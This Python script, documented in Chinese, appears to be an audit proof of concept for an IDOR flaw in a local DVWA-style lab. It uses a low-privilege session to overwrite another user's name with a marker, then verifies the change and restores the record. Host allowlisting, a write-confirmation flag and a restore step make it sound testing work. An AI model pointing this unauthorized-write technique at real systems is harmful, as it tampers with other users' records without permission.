#!/usr/bin/env python3
"""AUTH-001-F2 越权修改用户资料验证草案（写操作，需显式确认）。

只允许本机授权靶场与专用测试记录：先记录原值，提交无害标记，
通过独立读取入口回查，再恢复原值；不打印 Cookie 或口令。
依赖：Python 3.8+ 标准库（argparse/json/urllib）。
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
MARKER_PREFIX = "audit-mark-"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code,
                                     "redirect blocked: %s" % newurl, headers, fp)


def check_base_url(raw):
    parsed = urllib.parse.urlsplit(raw)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("only http/https is allowed")
    host = parsed.hostname or ""
    if host not in ALLOWED_HOSTS:
        raise SystemExit("host %r is not an authorised local target" % host)
    return raw.rstrip("/")


def read_cookie(path):
    with open(path, "r", encoding="utf-8") as fh:
        value = fh.read().strip()
    if not value:
        raise SystemExit("empty session file: %s" % path)
    return value


def opener():
    return urllib.request.build_opener(NoRedirect())


def request(op, method, url, cookie, timeout, payload=None):
    data = None
    headers = {"Accept": "application/json", "Cookie": cookie}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with op.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def fetch_user(op, url, cookie, timeout, user_id):
    status, body = request(op, "GET", url, cookie, timeout)
    try:
        rows = json.loads(body)
    except ValueError:
        return status, None, "non-JSON response: %r" % body[:120]
    if not isinstance(rows, list):
        return status, None, "non-array response: %r" % body[:120]
    for row in rows:
        if isinstance(row, dict) and str(row.get("user_id")) == str(user_id):
            return status, row, None
    return status, None, "user_id=%s not found (rows=%d)" % (user_id, len(rows))


def main():
    ap = argparse.ArgumentParser(description="AUTH-001-F2 write IDOR draft")
    ap.add_argument("--base-url", default="http://127.0.0.1")
    ap.add_argument("--read-path", default="/vulnerabilities/authbypass/get_user_data.php")
    ap.add_argument("--write-path", default="/vulnerabilities/authbypass/change_user_details.php")
    ap.add_argument("--session-file", required=True,
                    help="local file holding the low-privilege Cookie header")
    ap.add_argument("--test-user-id", required=True,
                    help="dedicated test record only; never admin or real data")
    ap.add_argument("--security-cookie", default=None,
                    help="optional extra pair such as security=low")
    ap.add_argument("--timeout", type=float, default=5.0)
    ap.add_argument("--confirm-write", action="store_true",
                    help="without this flag only the read baseline runs")
    args = ap.parse_args()

    if str(args.test_user_id) in ("0", "1"):
        raise SystemExit("refusing user_id=0/1; use a dedicated test record")
    base = check_base_url(args.base_url)
    cookie = read_cookie(args.session_file)
    if args.security_cookie:
        cookie = cookie + "; " + args.security_cookie
    op = opener()
    read_url = base + args.read_path
    write_url = base + args.write_path
    uid = str(args.test_user_id)

    print("[1] baseline read: user_id=%s" % uid)
    status, row, err = fetch_user(op, read_url, cookie, args.timeout, uid)
    print("    HTTP %s" % status)
    if err:
        print("    cannot establish baseline: %s" % err)
        print("    stop: no update is sent before the original values are recorded")
        return 1
    original = {"first_name": row.get("first_name"), "surname": row.get("surname")}
    print("    original values: %r" % original)

    if not args.confirm_write:
        print("[2] --confirm-write not supplied; baseline only, no update sent")
        return 0

    marker = MARKER_PREFIX + uid
    payload = {"id": args.test_user_id, "first_name": marker, "surname": marker}
    print("[2] low-privilege update: POST %s body=%s" % (write_url, json.dumps(payload)))
    status, body = request(op, "POST", write_url, cookie, args.timeout, payload)
    print("    HTTP %s, response: %r" % (status, body[:200]))

    print("[3] independent read-back")
    status, row2, err2 = fetch_user(op, read_url, cookie, args.timeout, uid)
    changed = (not err2 and row2 is not None
               and row2.get("first_name") == marker
               and row2.get("surname") == marker)
    print("    HTTP %s, record: %r" % (status, None if err2 else row2))
    print("    harmless marker observed: %s" % ("yes" if changed else "no"))

    print("[4] restore original values")
    restore = {"id": args.test_user_id,
               "first_name": original["first_name"],
               "surname": original["surname"]}
    status, body = request(op, "POST", write_url, cookie, args.timeout, restore)
    print("    HTTP %s, response: %r" % (status, body[:200]))
    status, row3, err3 = fetch_user(op, read_url, cookie, args.timeout, uid)
    restored = (not err3 and row3 is not None
                and row3.get("first_name") == original["first_name"]
                and row3.get("surname") == original["surname"])
    print("    restore confirmed: %s" % ("yes" if restored else "no, manual check needed"))
    return 0 if restored else 2


if __name__ == "__main__":
    sys.exit(main())
